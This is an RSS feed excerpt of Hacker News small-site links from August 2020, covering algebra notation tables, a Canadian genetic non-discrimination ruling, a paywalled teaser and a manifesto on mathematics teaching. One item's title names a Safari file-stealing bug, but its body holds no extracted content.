<strong>integers</strong></td><td>$m+n-2p = q$</td></tr><tr><td>$a, b, c$</td><td><strong>Coefficients</strong> of functions and equations</td><td>A linear equation has the general form $ax+by+c = 0$.</td></tr><tr><td>$x, y, z$</td><td><strong>Unknowns</strong> in functions and equations</td><td>If $14x + 2y = 4$, then $y = 2-7x$.</td></tr><tr><td>$\Delta$</td><td><strong><a href="https://en.wikipedia.org/wiki/Discriminant" target="_blank" aria-label="Discriminant (opens in a new tab)" rel="noreferrer noopener">Discriminant</a></strong></td><td>For <a aria-label="quadratic polynomials (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/quadratic-factorisation/#The_General_Method_Theory" target="_blank">quadratic polynomials</a>, $\Delta = b^2 – 4ac$.</td></tr><tr><td>$i, j, k$</td><td><strong>Index variables</strong></td><td>$\displaystyle \prod_{(i,j)=(1,1)}^{(3,5)} \frac{i + j}{2}$</td></tr><tr><td>$z$</td><td><strong><a href="https://en.wikipedia.org/wiki/Complex_number" target="_blank" aria-label="Complex numbers (opens in a new tab)" rel="noreferrer noopener">Complex numbers</a></strong></td><td>$ |z_1 z_2| = |z_1| |z_2|$</td></tr><tr><td>$f(x)$, $g(x, y)$, $h(z)$</td><td><strong>Functions</strong></td><td>$g(f(x), 3) = h(x)$</td></tr><tr><td>$\mathbf{u}, \mathbf{v}, \mathbf{w}$<br>(or $\vec{u}, \vec{v}, \vec{w}$)</td><td><strong><a href="https://en.wikipedia.org/wiki/Euclidean_vector" target="_blank" aria-label="Vectors (opens in a new tab)" rel="noreferrer noopener">Vectors</a></strong></td><td>$2\mathbf{u} + 3\mathbf{v} = 5\mathbf{w}$</td></tr><tr><td>$U, V, W$</td><td><strong><a href="https://en.wikipedia.org/wiki/Vector_space" target="_blank" aria-label="Vector spaces (opens in a new tab)" rel="noreferrer noopener">Vector spaces</a></strong></td><td>$U$ is a subspace of vector space $V$.</td></tr><tr><td>$A, B, C$</td><td><strong><a href="https://en.wikipedia.org/wiki/Matrix_(mathematics)" target="_blank" aria-label="Matrices (opens in a new tab)" rel="noreferrer noopener">Matrices</a></strong></td><td>$AB \ne BA$</td></tr><tr><td>$\lambda$</td><td><strong><a href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Formal_definition" target="_blank" aria-label="Eigenvalues (opens in a new tab)" rel="noreferrer noopener">Eigenvalues</a></strong></td><td>Since $A\mathbf{v_0}=3\mathbf{v_0}$, $3$ is an eigenvalue of $A$.</td></tr><tr><td>$G, H$</td><td><strong><a href="https://en.wikipedia.org/wiki/Group_(mathematics)#Definition" target="_blank" aria-label="Groups (opens in a new tab)" rel="noreferrer noopener">Groups</a></strong></td><td>There exists an element $e \in G$ such that for all $x \in G$, $x \circ e = x$.</td></tr><tr><td>$\mathbb{F}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Field_(mathematics)" target="_blank" aria-label="Fields (opens in a new tab)" rel="noreferrer noopener">Fields</a></strong></td><td>A polynomial ring $\mathbb{F}[x]$ consists of polynomials with coefficients from field $\mathbb{F}$.</td></tr><tr><td>$X, Y$</td><td><strong><a href="https://en.wikipedia.org/wiki/Indeterminate_(variable)" target="_blank" aria-label="Indeterminates (opens in a new tab)" rel="noreferrer noopener">Indeterminates</a></strong></td><td>$3X^2Y + 5Y \in \\ \mathbb{Z}[X, Y]$</td></tr></tbody></table></figure><h2><span id="Delimiters"></span>Delimiters<span></span></h2><p>In mathematics, delimiters are symbols used to denote the separation between independent mathematical entities. The following table features some of the most common delimiters in algebra. For common delimiters in general, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Delimiters" target="_blank" rel="noopener noreferrer">common delimiters</a>.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$()$, $[]$, $\begin{pmatrix} x \\ y \\ z \end{pmatrix}$, $\begin{bmatrix} x &amp; y \\ w &amp; z\end{bmatrix}$</td><td><strong>Vectors/matrices indicators</strong></td><td>$\begin{pmatrix} 1 \\ 2 \\ 3 \end{pmatrix} +  \begin{pmatrix} 4 \\ 5 \\ 6 \end{pmatrix} = \\ \begin{pmatrix} 5 \\ 7 \\ 9 \end{pmatrix} $</td></tr><tr><td>$\{ \}$</td><td><strong>Set builder</strong></td><td>$\{ -1, 3.\overline{5}, \pi \} \in \mathbb{R}$</td></tr><tr><td>$\bigg\{$</td><td><strong><a href="https://en.wikipedia.org/wiki/Piecewise" target="_blank" aria-label="Piecewise-function (opens in a new tab)" rel="noreferrer noopener">Piecewise-function</a> indicator</strong></td><td>$|x| = \begin{cases} x &amp; x \ge 0 \\ -x &amp; x&lt;0 \end{cases}$</td></tr><tr><td>$:$, $\mid$</td><td><strong>“Such that” marker</strong></td><td>$\mathbb{Q} =$<br>$\displaystyle \left\{ \frac{x}{y} \,\middle|\, x \in \mathbb{Z}, y \in \mathbb{N} \right\}$</td></tr></tbody></table></figure><h2>Function-related Symbols<span></span></h2><p>As a foundational component of algebra, <strong>function</strong> plays a key role in establishing the rules pertaining to the manipulation of symbols. The following table documents some of the most common function-related operators and notational symbols — along with their meaning and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$f : A \to B$,<br>$A \overset{f}{\to} B$</td><td><strong>Function mapping rule</strong><br>($f$ maps set $A$ to set $B$)</td><td>The function $f:\mathbb{N} \to \mathbb{R}$ with $f(x)=x^2$ is strictly increasing.</td></tr><tr><td>$f: x \mapsto y$,<br>$x \overset{f}{\mapsto} y$</td><td><strong>Function mapping rule</strong><br>($f$ maps element $x$ to element $y$)</td><td>The function $g: x \to x^3$ takes a number to its cube.</td></tr><tr><td>$\mathrm{dom}(f)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Domain_of_a_function" target="_blank" aria-label="Domain (opens in a new tab)" rel="noreferrer noopener">Domain</a></strong> of $f$</td><td>$\mathrm{dom} (g) = \mathbb{R}_+$</td></tr><tr><td>$\mathrm{ran}(f)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Range_of_a_function" target="_blank" aria-label="Range (opens in a new tab)" rel="noreferrer noopener">Range</a></strong> of $f$</td><td>If $\mathrm{ran} (f) = \mathbb{Z}$, then $f$ is an integer-valued function.</td></tr><tr><td>$f(x)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Image_of_an_element" target="_blank" aria-label="Image of element (opens in a new tab)" rel="noreferrer noopener">Image of element</a></strong> $x$ under function $f$</td><td>$f(g(3)) = f(5) = 7$</td></tr><tr><td>$f(X)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Image_of_a_subset" target="_blank" aria-label="Image of set (opens in a new tab)" rel="noreferrer noopener">Image of set</a> </strong>$X$ under function $f$</td><td>If $f(x) = \tan(x)$, then $f\left[ \left(-\frac{\pi}{2}, \frac{\pi}{2}\right) \right] = \mathbb{R}$</td></tr><tr><td>$f^{-1}(y)$</td><td><strong><a aria-label="Inverse function (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/derivative-inverse-functions/#A_Primer_on_Inverse_Functions" target="_blank">Inverse function</a></strong> of $f$, <strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Inverse_image" target="_blank" aria-label="pre-image (opens in a new tab)" rel="noreferrer noopener">pre-image</a></strong> of element $y$ under function $f$</td><td>If $f$ is an <a href="https://mathvault.ca/math-glossary/#onetoone" target="_blank" aria-label="one-to-one (opens in a new tab)" rel="noreferrer noopener">one-to-one</a> function with $f(3)=5$, then $f^{-1}(5)=3$.</td></tr><tr><td>$f^{-1}(Y)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Inverse_image" target="_blank" aria-label="Pre-image (opens in a new tab)" rel="noreferrer noopener">Pre-image</a></strong> of set $Y$ under function $f$</td><td>If $g: \mathbb{R} \to \mathbb{R}$ with $g(x)=x^2$, then $g^{-1}([0, 1]) = [-1, 1]$.</td></tr><tr><td>$f \circ g$</td><td><strong><a href="https://mathvault.ca/chain-rule-derivative/#Chain_Rule_A_Review" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Composite function</a></strong> $f$ of $g$</td><td>If $f(x)=5x$ and $g(x)=x^3$, then $(f \circ g) (x) = 5x^3$.</td></tr><tr><td>$f |_A$</td><td><strong><a aria-label="Restriction (opens in a new tab)" href="https://en.wikipedia.org/wiki/Restriction_(mathematics)" target="_blank" rel="noreferrer noopener">Restriction</a></strong> of function $f$ to set $A$</td><td>$\mathrm{dom}(f |_A) =$<br>$A \cap \mathrm{dom}(f)$</td></tr><tr><td>$R \circ S$</td><td><strong><a aria-label="Composite relation (opens in a new tab)" href="https://en.wikipedia.org/wiki/Composition_of_relations" target="_blank" rel="noreferrer noopener">Composite relation</a></strong> $R$ of $S$</td><td>If $(1, 3) \in R$ and $(3, 6) \in S$, then $(1, 6) \in R \circ S$.</td></tr><tr><td>$R^{-1}$</td><td><strong><a aria-label="Inverse relation (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Converse_relation" target="_blank">Converse relation</a></strong> of $R$</td><td>$(x, y) \in R^{-1} \iff$<br>$(y, x) \in R$</td></tr><tr><td>$R^{+}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Transitive_closure" target="_blank" aria-label="Transitive closure (opens in a new tab)" rel="noreferrer noopener">Transitive closure</a></strong> of relation $R$</td><td>For all transitive relations $T$ containing $R$, $R^{+} \subseteq T$.</td></tr></tbody></table></figure><h2><span id="Operators"></span>Operators<span></span></h2><p>In algebra, <strong>operators</strong> can be thought of as a special type of function mapping one or multiple mathematical entities to another, and are often given special names or notations due to their repeated occurrences.</p><p>In particular, these operators are often related to <strong>numbers</strong>, <strong>key functions</strong>, <strong>linear algebra</strong> and <strong>abstract algebra</strong> — the vast majority of which are found in the tables below. For common operators in general, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Operators" target="_blank" rel="noopener noreferrer">common operators</a>.</p><h3>Number-related Operators<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\gcd (x,y)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Greatest_common_divisor" target="_blank" aria-label="Greatest common divisor (opens in a new tab)" rel="noreferrer noopener">Greatest common divisor</a></strong> of $x$ and $y$</td><td>$\gcd (20, 15) = 5$</td></tr><tr><td>$\mathrm{lcm} (x, y)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Least_common_multiple" target="_blank" aria-label="Least common multiple (opens in a new tab)" rel="noreferrer noopener">Least common multiple</a></strong> of $x$ and $y$</td><td>$\mathrm{lcm} (x, y) = \dfrac{xy}{\gcd (x, y)}$</td></tr><tr><td>$x \bmod y$</td><td><strong><a aria-label=" (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/long-division/#Euclidean_Division_Terminology" target="_blank">Remainder</a></strong> of $x$ when divided by $y$</td><td>$23 \bmod 4 = 3$</td></tr><tr><td>$|x|$</td><td><strong>Absolute value</strong> of $x$</td><td>$|-5| = |5| = 5$</td></tr><tr><td>$\lfloor x \rfloor$</td><td><strong><a href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions" target="_blank" aria-label="Floor (opens in a new tab)" rel="noreferrer noopener">Floor</a></strong> of $x$</td><td>$\lfloor 5.999 \rfloor = 5$</td></tr><tr><td>$\lceil x \rceil$</td><td><strong><a href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions" target="_blank" aria-label="Ceiling (opens in a new tab)" rel="noreferrer noopener">Ceiling</a></strong> of $x$</td><td>For all $x \in \mathbb{R}$,  $\lceil x \rceil-1 &lt; x \le \lceil x \rceil$.</td></tr><tr><td>$\lfloor x \rceil$, $\mathrm{round}(x)$</td><td><strong><a href="https://mathworld.wolfram.com/NearestIntegerFunction.html" target="_blank" aria-label="Nearest integer (opens in a new tab)" rel="noreferrer noopener">Nearest integer</a></strong> of $x$</td><td>$\mathrm{round}(3.5) =4$</td></tr><tr><td>$\max (A)$</td><td><strong>Maximum </strong>of set $A$</td><td>$\max \left( \{3, 11, 5 \}\right) = 11$</td></tr><tr><td>$\min (A)$</td><td><strong>Minimum</strong> of set $A$</td><td>For all $x \in A$, $\min (A) \le x$.</td></tr><tr><td>$\displaystyle \sum_{i=1}^{n} a_i$, $ \displaystyle \sum_{(i, j) = (1, 1)}^{(m, n)} a_{ij}$, $\displaystyle \sum_{i \in I} a_i$</td><td><strong><a href="https://en.wikipedia.org/wiki/Summation#Notation" target="_blank" aria-label="Sum (opens in a new tab)" rel="noreferrer noopener">Sum</a></strong> of $a_i$/$a_{ij}$</td><td>$\displaystyle \sum_{(i, j) = (1, 1)}^{(5, 5)} \frac{i+j}{2} \ge 15$</td></tr><tr><td>$\displaystyle \prod_{i=1}^n a_i$, $ \displaystyle \prod_{(i, j) = (1, 1)}^{(m, n)} a_{ij}$,  $\displaystyle \prod_{i \in I} a_i$</td><td><strong><a href="https://en.wikipedia.org/wiki/Multiplication#Capital_pi_notation" target="_blank" aria-label="Product (opens in a new tab)" rel="noreferrer noopener">Product</a></strong> of $a_i$/$a_{ij}$</td><td>$\displaystyle \prod_{i \in \{ 3, 5, 7\} } (i^2-1) =$<br>$8 \cdot 24 \cdot 48$</td></tr></tbody></table></figure><h3><span id="Key_Functions"></span>Key Functions<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$k_n x^n + \cdots + k_0 x^0$</td><td><strong><a href="https://mathvault.ca/polynomial-infinity/#Polynomials_A_Review" target="_blank" aria-label="Polynomial (opens in a new tab)" rel="noreferrer noopener">Polynomial</a></strong> of degree $n$ with coefficients $k_0, \ldots, k_n$</td><td>$2x^3 (x+1) = $<br>$2x^4 + 2x^3$</td></tr><tr><td>$e^x, \exp x$</td><td><strong><a href="https://en.wikipedia.org/wiki/Exponential_function" target="_blank" aria-label="Natural exponential function (opens in a new tab)" rel="noreferrer noopener">Natural exponential function</a></strong></td><td>For all $x \ge 3$, $e^x \ge 20$.</td></tr><tr><td>$b^x$</td><td><strong><a href="https://en.wikipedia.org/wiki/Exponential_function" target="_blank" aria-label="Exponential function (opens in a new tab)" rel="noreferrer noopener">Exponential function</a></strong> with base $b$</td><td>$2^{x+y} = 2^x \cdot 2^y$</td></tr><tr><td>$\ln x$</td><td><strong><a href="https://mathvault.ca/logarithm-theory/#Natural_Logarithm_Base_e" target="_blank" aria-label="Natural logarithmic function (opens in a new tab)" rel="noreferrer noopener">Natural logarithmic function</a></strong></td><td>$\ln 10 = \ln 2 + \ln 5$</td></tr><tr><td>$\log x$</td><td><strong><a aria-label="Common logarithmic function (opens in a new tab)" href="https://mathvault.ca/logarithm-theory/#Common_Logarithm_Base_10" target="_blank" rel="noreferrer noopener">Common logarithmic function</a></strong></td><td>$\log 1000000 = 6$</td></tr><tr><td>$\log_b x$</td><td><strong><a href="https://en.wikipedia.org/wiki/Logarithm" target="_blank" aria-label="Logarithmic function (opens in a new tab)" rel="noreferrer noopener">Logarithmic function</a></strong> of base $b$</td><td>$\log_{11} 23 = \dfrac{\ln 23}{\ln 11}$</td></tr><tr><td>$\sin x$, $\cos x$, $\tan x$, $\sec x$, $\csc x$, $\cot x$</td><td>6 <strong><a href="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/#Trigonometric_Functions" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">trigonometric functions</a></strong> (sine, cosine, tangent, secant, cosecant, cotangent)</td><td>$\csc x = \dfrac{1}{\sin x}$</td></tr><tr><td>$\arcsin(x)$, $\sin^{-1}(x)$, $\arccos(x)$, $\cos^{-1}(x)$, $\arctan(x)$, $\tan^{-1}(x)$</td><td><strong><a aria-label="Inverse trigonometric functions (opens in a new tab)" href="https://en.wikipedia.org/wiki/Inverse_trigonometric_functions" target="_blank" rel="noreferrer noopener">Inverse trigonometric functions</a></strong> (inverse sine, inverse cosine, …</td></tr></tbody></table></figure></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/">https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/</a></em></p>]]>
            </description>
            <link>https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274474</guid>
            <pubDate>Tue, 25 Aug 2020 18:33:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing local files using Safari Web Share API]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274405">thread link</a>) | @ra7
<br/>
August 25, 2020 | https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html?m=1 | <a href="https://web.archive.org/web/*/https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html?m=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html?m=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274405</guid>
            <pubDate>Tue, 25 Aug 2020 18:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Supreme Court of Canada Upholds Genetic Non-Discrimination Act]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274306">thread link</a>) | @mpatobin
<br/>
August 25, 2020 | https://www.fightingblindness.ca/news/11-years-in-the-making-supreme-court-of-canada-passes-genetic-non-discrimination-act-gnda | <a href="https://web.archive.org/web/*/https://www.fightingblindness.ca/news/11-years-in-the-making-supreme-court-of-canada-passes-genetic-non-discrimination-act-gnda">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="readspeak">
			<div>
				<div>
					<div itemscope="" itemprop="mainContentOfPage" itemtype="http://schema.org/Article">
						<h5>Aug 12, 2020</h5>
						
						
																				
<p>In the past decades, genetic testing has played a growing
role in the diagnosis of inherited eye diseases such as retinitis pigmentosa, Usher
syndrome and Leber Congenital Amaurosis. Not only can a genetic test
information provide accuracy about how the eye disease will progress, but it also
takes on a greater significance as new gene-specific treatments, such as gene
therapy and gene editing are starting to be developed. &nbsp;Without a genetic test result, individuals might
not be eligible to participate in clinical trials or to receive these new treatments.
</p>



<p>To protect the privacy of Canadians’ genetic test
information, in 2009, Huntington Society of Canada, Fighting Blindness Canada
(FBC), Parkinson Canada, and other leading Canadian health charities came
together to be part of the Canadian Coalition for Genetic Fairness (CCGF), all
meeting at Parliament Hill to discuss genetic discrimination, providing a voice
for their patient communities. For 11 years, CCGF would work endlessly to
advocate for the protection of genetic test information privacy, sharing real
life stories from across Canada. </p>



<p>In May 2017, the Genetic
Non-Discrimination Act (GNDA) received Royal Assent and became law. However, the
Quebec government appealed this decision and did not agree that the GNDA was a valid act of Parliament’s
criminal law power, putting the GNDA at risk and forcing the CCGF to
refer it to the Supreme Court of Canada for their opinion.</p>



<p>What did unprotected genetic test information mean for Canadians? Simply put, if you had a genetic test done, the information was not private and could be used against you. This means it was possible for companies, such as insurance companies, to demand to see your genetic test information, which could be used to deny you coverage. Or an employer might use the genetic test information to make assumptions about your health and ability. </p>



<p>While the European Union (28 countries) were signatories to the Oviedo Convention that was first presented in 1997 (agreeing to not use genetic test information), Canada was falling behind. &nbsp;As science evolved and genetic testing became more routine, researchers and medical experts came forth to express their concern and the need to protect the privacy of genetic test information. </p>



<p>Canadian researchers like Dr. Yvonne Bombard (a genomics health services researcher and Scientist at the Li Ka Shing Knowledge Institute of St. Michael’s Hospital, Toronto) voiced concerns that if the Canadian government did not protect genetic test information, people would be afraid to participate in clinical trials, putting research and future medical advancements in jeopardy. In a written testimony to the Standing Senate Committee Dr. Bombard stated, </p>



<blockquote><p>“Genetic discrimination – the differential treatment of an individual based on genetic information – represents an important social risk associated with genetic testing. The extent and impact of genetic discrimination has been the subject of much public concern and policy attention.”<a href="#_edn1">[i]</a> <a href="https://sencanada.ca/content/sen/committee/421/RIDR/Briefs/Bombard-UnivTorontoWrittenTestimony_e.pdf">(access full testimonial and results from her study)</a></p></blockquote>



<p>After many years of dedication and hard work, on July 3rd,
2020 the Supreme Court of Canada upheld the GNDA. Passing of the act was no
easy task. CCGF experienced several barriers, including push back from
insurance companies, government turnover, and the belief from some that genetic
discrimination was not real. </p>



<p>Bev Heim-Myers, CCGF Chair explains, </p>



<blockquote><p>“Getting to where we are today was not easy but it was a huge milestone for all Canadians and worth the fight.” Sharing further, “…years ago, many thought we were doing the impossible. Genetic discrimination –what was that? Conversations were business centred not patient centered. Together, we flipped the conversation.”</p></blockquote>



<p>Champion volunteers came together from organizations like FBC to share their stories and get the attention of Parliament. </p>



<blockquote><p>“People’s lives were being ruined based on perception,” Bev explains. “Seniors were being denied entrance into long-term care, children denied adoption –genetic discrimination was ruining lives and it was time that governments listened.”</p></blockquote>



<p>For Bev and other CCGF representatives like Sharon Colle, former President and CEO of FBC, the fight to pass the GNDA was not about if, but when. The act’s undivided purpose was (and remains) to protect the health and privacy of all Canadians. And, as champion voices grew louder over the course of the 11 years it took to get the act in place, it was clear that the well-being of Canadians came first.</p>



<p>FBC is honoured to be part of this historic endeavor that will protect generations to come. With the support of our dedicated vision loss community, we brought a voice to the thousands of individuals living with inherited eye diseases and the millions of Canadians living with genetic conditions. </p>



<hr>



<p><a href="#_ednref1">[i]</a> <a href="https://sencanada.ca/content/sen/committee/421/RIDR/Briefs/Bombard-UnivTorontoWrittenTestimony_e.pdf">https://sencanada.ca/content/sen/committee/421/RIDR/Briefs/Bombard-UnivTorontoWrittenTestimony_e.pdf</a></p>
											</div>
					

				</div>
			</div>
		</div></div>]]>
            </description>
            <link>https://www.fightingblindness.ca/news/11-years-in-the-making-supreme-court-of-canada-passes-genetic-non-discrimination-act-gnda</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274306</guid>
            <pubDate>Tue, 25 Aug 2020 18:19:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Worldly Wisdom]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274238">thread link</a>) | @yarapavan
<br/>
August 25, 2020 | https://ltcwrk.com/worldly-wisdom/ | <a href="https://web.archive.org/web/*/https://ltcwrk.com/worldly-wisdom/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Worldly Wisdom can be thought of as meta-learning or meta-ideas â€“ essentially instruction manuals for life. These concepts are universally valuable and applicable, being time-tested and proven robust. We begin with these ideas because, if properly applied, they can form the â€œkernelâ€� to your â€œoperating systemâ€� â€“ governing how you think and learn, paving the way for deeper understanding later on.</p>
<p>...</p>		<p>
                 <h4>To Continue Reading...</h4>
                <!-- <ul>
                 <li class='wc_active'><a href="https://ltcwrk.com/join-us/?redirecturl=d29ybGRseS13aXNkb20=">Join Us</a>
                 
                 </li>
                  <li class='wc_active'><a href="https://ltcwrk.com/?memberful_endpoint=auth">Sign In</a> </li>
                 </ul>  -->
		</p>
		<div><form method="POST" action="" id="wcwaitlistform"><p><label for="wcnewsalert1">Newsletter</label></p><div><div></div><div></div></div></form></div>	</div></div>]]>
            </description>
            <link>https://ltcwrk.com/worldly-wisdom/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274238</guid>
            <pubDate>Tue, 25 Aug 2020 18:12:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Manifesto on the Teaching of Mathematics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274186">thread link</a>) | @noch
<br/>
August 25, 2020 | http://intellectualmathematics.com/manifesto/ | <a href="https://web.archive.org/web/*/http://intellectualmathematics.com/manifesto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<div id="primary">
		<main id="main" role="main">

		
<article id="post-31" class="page">
	

	
	<div>
		<p>My general teaching philosophy can be summarised in three principles or axioms regarding learning. They concern the source, the process, and the goal of learning respectively.</p>
<p>My first axiom is this: In a perfect world students pursue learning not because it is prescribed to them but rather out of a genuine desire to figure things out. We must therefore teach as if our students were of this kind. Only by aspiring to this ideal can we bring it closer to being realised.</p>
<p>It follows that we must not introduce any topic for which we cannot first convince the students that they should want to pursue it. This is a standard very rarely met in mathematics. Everyone likes to tell themselves that they are giving motivations for what they teach, but very little of what passes for motivation stands up to critical scrutiny as a motivation in the sense of the learning ideal outlined above. In all such cases, therefore, the student has no reason to pursue the topic in question other than obedience to the dictatorial authority of the teacher. In my view we cannot fault a student who hates mathematics in such circumstances; if anything, I would sooner fault a student who did not.</p>
<p>My second axiom concerns the process of learning. It says: We learn when we are challenged, when we push ourselves. If you’re not stuck you’re not learning. If it’s not a struggle you’re not doing it right.</p>
<p>It follows that we must always look for new points of view and pursue open-ended questions. The role of the teacher is not to make life easy for the student by giving crystal clear lectures and predictable tests. Instead the role of the teacher is to guide and encourage the student’s own process of learning by setting suitable challenges and by stimulating thought and reflection.</p>
<p>The final axiom of my teaching philosophy is that the goal of teaching is independent thought. We want students to be able to think and reason and apply what they know in new situations. We do not want to create robots or parrots or one-trick ponies.</p>
<p>It follows that when we learn something we must always inquire why it is so, and that we must answer this question according to our own judgement, not by mimicking some external standards of rigour and proof. It also follows that we must always seek out the broader meaning of what we are studying through its applications and interconnections with other ideas.</p>
<p>* &nbsp; &nbsp; * &nbsp; &nbsp; *</p>
<p>I have coined the phrase “Intellectual Mathematics” for the teaching philosophy I have in mind, because its fundamental principle is to treat students with the greatest possible intellectual respect.</p>
<p>This is the opposite of traditional mathematics teaching, which treats students like circus animals who need to be taught to jump through hoops by means of mindless drill training.</p>
<p>In the traditional approach the essence of the teacher’s role is authority. The teacher holds the carrot and the stick and that’s why you have to do as he says.</p>
<p>In the Intellectual Mathematics approach the essence of the teacher’s role is inspiration, and the goal of teaching is to stimulate thought and reflection. The teacher disavows the notion that he has the right to boss people around. Instead he considers it his responsibility to nourish in the students a desire to pursue their studies out of their own intrinsic motivation and interest.</p>
<p>It follows that in Intellectual Mathematics a topic is introduced only when the student can be convinced of the value of doing so. This is the opposite of the traditional approach where topics are routinely introduced at a stage where they serve no credible purpose whatsoever, simply because some curriculum designer decided that the students “need to have seen it” a year or two down the line.</p>
<p>Traditional curriculum designers butcher mathematics the way colonialists used to divide conquered continents: with crude and clinical cuts that are profoundly insensitive to any and all organic connections between the constituent parts. Such an approach makes sense for those who take their own authority for granted.</p>
<p>Intellectual Mathematics does not use such totalitarian techniques. Borders are not drawn where they do not belong and organic connections are respected. Mathematics is not severed from physics, nor differential equations from calculus, and so on, regardless of the administrative efficiencies of such compartmentalisation. You do not read every other line of a Shakespeare play in one class, and then the remaining lines in another class the following year. But in mathematics we routinely do precisely this. Such an approach is incompatible with intellectual respect for the students.</p>
<p>In traditional mathematics, things are taught because they are replicable and testable. The teacher is so dependent on the drillmaster paradigm that only topics that fit it can be taught. If a topic doesn’t allow for fifty-eight near-identical drill problems at the end of the section, then that topic is unteachable in traditional mathematics. It will not be taught no matter how important or crucial for understanding the true purpose of the entire subject. Conversely, topics that do lend themselves to endless drill problems will often be taught for this reason alone, despite being utterly pointless and contrived.</p>
<p>In Intellectual Mathematics, presenting topics in an inherently interesting and meaningful way is the first and foremost consideration. The purpose of the problems at the end of the section is not to force students through a repetitive obstacle course, but to convince the students of the value and importance of what they are studying.</p>
<p>The traditional approach fosters robotic, unthinking students. It selects for obedience and punishes independent and critical thought. Intellectual Mathematics does the opposite.</p>
<p>I say with Rousseau: “Let the child do nothing because he is told; nothing is good for him but what he recognises as good. When you are always urging him beyond his present understanding, you think you are exercising a foresight which you really lack. To provide him with useless tools which he may never require, you deprive him of man’s most useful tool — common-sense. You would have him docile as a child; he will be a credulous dupe when he grows up. You are always saying, ‘What I ask is for your good, though you cannot understand it. ...’ All these fine speeches with which you hope to make him good, are preparing the way, so that … every kind of fool may catch him in his snare or draw him into his folly.”</p>
<p>* &nbsp; &nbsp; * &nbsp; &nbsp; *</p>
<p>Intellectual Mathematics should not be confused with what passes for “reform” teaching. Everything we have said about the traditional approach applies equally well to “reform” approaches, because what is called “reform” pertains almost exclusively to surface form, not substance.</p>
<p>The basic fault of the modern “reform” movement is that it does not have the courage and confidence and ability to challenge the mathematical establishment on matters of substance. It assumes that the traditional approach is mathematically infallible, though pedagogically flawed. It therefore busies itself with concocting pedagogical schemes to make the same old medicine go down more easily. Group work! Use of technology! Inquiry learning! Flipping the classroom!</p>
<p>Modern “reform” efforts start at the wrong end. They put the cart before the horse, lipstick on the pig. The enterprise is doomed because it is predicated on the false assumption that the underlying curriculum is beyond rebuke. It doesn’t matter what pedagogical tricks you use if the substance you are trying to teach is poorly conceived in the first place. It is impossible to teach bad material well. That is why any reform worthy of its name needs to actually reform mathematical substance.</p>
<p>The Intellectual Mathematics approach starts with content and substance. It is not primarily about how to teach, but what to teach. It does not start with the question: “How can we make students understand concept X?” Rather it starts with the question: “Should we even teach concept X in the first place? If so, why?” This should be the guiding question of true reform.</p>
<p>* &nbsp; &nbsp; * &nbsp; &nbsp; *</p>
<p>Intellectual Mathematics is written for the intellectual fulfilment of the reader. This means that it seeks the most satisfying explanations, the most vivid illustrations, and the most compelling motivations. It also means that it engages our intuition whenever possible.</p>
<p>Traditional mathematics is written for robots and nitpickers. It is obsessed with being technically correct at the expense of all else. Again and again the ugliest proofs and the most contrived order of presentation are favoured in the traditional approach on the sole grounds that they are the easiest to write down in a manner that cannot be faulted with respect to logical correctness.</p>
